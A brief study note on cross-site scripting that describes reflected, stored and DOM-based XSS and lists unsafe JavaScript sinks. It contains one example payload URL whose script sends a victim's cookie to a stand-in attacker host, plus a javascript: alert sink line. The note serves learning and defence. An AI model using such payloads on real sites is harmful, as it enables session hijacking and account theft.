# XSS

Cross-site scripting

## Reflected XSS

No persistence; immediately executed

Eg.

If a server returns HTML response based on the `q` param below:

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

then clicking on this link will automatically executes the script, which redirects to the location while appending the cookie, which allows the attackers server to log the request.

## Stored XSS

(aka Persistent XSS)

1. Payload is saved in database. (source)
2. Later fetched and executed by a problematic code (sink)

## DOM-based XSS

Client-side JavaScript on the page writes to DOM unsafely

---

## Sinks

* `.innerHtml`
* `.src`
* `eval(...)`
* `setTimeout(..)`
* `setInterval(...)`
* `location.href = "javascript:alert('xss')"`
